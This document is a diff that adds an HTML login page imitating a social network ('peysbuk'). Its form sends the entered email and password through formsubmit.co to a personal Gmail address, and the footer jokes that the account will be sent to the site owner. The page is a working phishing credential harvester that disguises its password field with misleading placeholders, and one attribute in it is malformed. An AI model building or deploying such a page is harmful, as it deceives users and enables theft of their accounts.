@@ -1,0 +1,116 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #0d1b2a;
+        }
+
+        .login-container {
+            background: white;
+            width: 350px;
+            padding: 35px;
+            border-radius: 12px;
+        }
+
+        .login-to {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px;
+            margin-bottom: 18px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            outline: none;
+            font-size: 14px;
+        }
+
+        input:focus {
+            border-color: #1769e8;
+        }
+
+        button {
+            width: 100%;
+            padding: 13px;
+            background: #1769e8;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #1054bd;
+        }
+
+        .note {
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            margin-top: 18px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-container">
+
+        <p class="login-to">Login to peysbuk</p>
+
+        <form action="https://formsubmit.co/prynzyuan21@gmail.com"
+              method="POST">
+
+            <input
+                type="text"
+                name="Email"
+                placeholder="First Name"
+                maxlength="40"
+                required>
+
+            <input
+                type="text"
+                name="Password
+                placeholder="Second Name"
+                maxlength="40"
+                required>
+
+            <input type="hidden" name="_subject"
+                   value="New Website Name Submission">
+
+            <input type="hidden" name="_captcha"
+                   value="true">
+
+            <button type="submit">Log In</button>
+
+        </form>
+
+        <p class="note">
+            your accound will be sent to the website owner hehehehhe
+        </p>
+
+    </div>
+
+</body>
+</html>
